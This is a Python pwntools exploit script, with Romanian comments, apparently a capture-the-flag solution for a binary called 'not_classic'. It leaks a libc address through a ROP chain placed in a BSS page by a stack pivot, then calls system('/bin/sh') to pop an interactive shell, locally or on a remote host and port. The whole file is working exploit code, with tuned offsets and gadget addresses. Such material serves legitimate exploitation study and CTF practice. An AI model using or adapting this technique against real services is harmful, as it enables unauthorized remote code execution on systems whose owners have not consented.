#!/usr/bin/env python3
# not_classic — ret2libc prin STACK PIVOT in pagina BSS `stacks`.
#   local:  python3 script.py
#   remote: python3 script.py HOST PORT
#
# Mecanism:
#  * read_password are overflow minuscul (buffer 0x20, fgets 0x38): incape doar
#    return-address + adresa de pivot. Lantul ROP complet il scriem in `stacks`
#    (0x404080) prin read_username (fgets 0x400) si pivotam cu g (pop rsp).
#  * Avem nevoie de 2 runde: 1) leak libc via puts(puts@got); 2) system("/bin/sh").
#
# Subtilitati esentiale (toate verificate cu gdb/coredump):
#  1. Zona scriibila e UN SINGUR page 0x404000..0x405000. Functiile libc isi
#     folosesc stiva crescand IN JOS de la rsp; daca pivotam prea jos, rsp
#     coboara sub page -> SIGSEGV. Deci lanturile trebuie plasate SUS in page.
#  2. Dupa leak NU ne intoarcem in `main`: ar reintra in read_password, al carui
#     printf("Hi,%s") foloseste ~0x400 octeti de stiva si crapa pe page-ul BSS.
#     In schimb ne intoarcem direct in `read_username` (doar puts+fgets).
#  3. do_system are nevoie de ~0x3c0 octeti de stiva sub rsp; lantul `system`
#     trebuie la SOFF=0x320 - suficient de sus pt do_system, dar suficient de jos
#     cat sa nu calce frame-ul lui read_username (runda 2). Fereastra e ingusta.
#  4. Payload-ul pt read_password are EXACT 55 octeti trimisi cu send() (fara \n):
#     fgets(.,56,.) citeste 55 si pune '\0' la index 55 = al 8-lea octet al
#     adresei de pivot. Fara newline => stdin ramane curat.
import sys
from pwn import *

context.binary = elf = ELF('./not_classic')
context.log_level = 'info'

if len(sys.argv) >= 3 and sys.argv[2].isdigit():
    p, libc = remote(sys.argv[1], sys.argv[2]), ELF('./libc.so')
else:
    p, libc = process('./not_classic'), elf.libc

# --- gadget-uri / adrese statice (No PIE) ---
POP_RDI  = 0x401166          # f: pop rdi ; ret
RET      = 0x401167          # ret curat (aliniere movaps)
PIVOT_G  = 0x40116b          # g: pop rsp ; add rsp, 0x8 ; ret
RDUSER   = 0x401174          # read_username (doar puts + fgets, fara printf)
PUTS_PLT = elf.plt['puts']   # 0x401030
PUTS_GOT = elf.got['puts']   # 0x404000
STACKS   = 0x404080          # unde scrie read_username (fgets 0x400)

def place(off, qwords):
    # scrie qwords incepand de la STACKS+off (padding 'B' pana acolo)
    return b'B' * off + b''.join(p64(x) for x in qwords)

def pivot(dst):
    # read_password: 40 pad + ret-addr(g) + 8 octeti = dst (noul rsp). 55 octeti.
    return b'A' * 40 + p64(PIVOT_G) + p64(dst)[:7]

# g face: pop rsp (=dst), add rsp,8, ret -> executa de la dst+8.

# ---------- Runda 1: leak puts@libc, apoi RE-ENTRY in read_username ----------
# Lantul de leak sta sus (L=0x388) ca puts sa aiba loc. Se termina cu:
#   READ_USERNAME -> reintra ca sa citeasca runda 2
#   PIVOT_G, PIVOT_DST2 -> dupa `pop rbp; ret` din read_username, pivoteaza la
#   lantul `system` scris de runda 2.
L = 0x388
SOFF = 0x320                 # pozitia lantului system (fereastra ingusta!)
PIVOT_DST2 = STACKS + SOFF - 8

leak_chain = place(L, [RET, POP_RDI, PUTS_GOT, PUTS_PLT, RDUSER, PIVOT_G, PIVOT_DST2])

p.recvuntil(b"name")
p.sendline(leak_chain)
p.recvuntil(b"password ?")
p.send(pivot(STACKS + L - 8))   # pivot la lantul de leak
p.recvuntil(b"No\n")
leak = u64(p.recv(6).ljust(8, b'\x00'))
libc.address = leak - libc.sym['puts']
log.success("puts@libc = %#x", leak)
log.success("libc base = %#x", libc.address)

system = libc.sym['system']
binsh  = next(libc.search(b'/bin/sh\x00'))

# ---------- Runda 2: read_username citeste lantul system; pivot -> shell ------
p.recvuntil(b"name")
p.sendline(place(SOFF, [RET, POP_RDI, binsh, system]))

log.success("pop shell")
p.interactive()
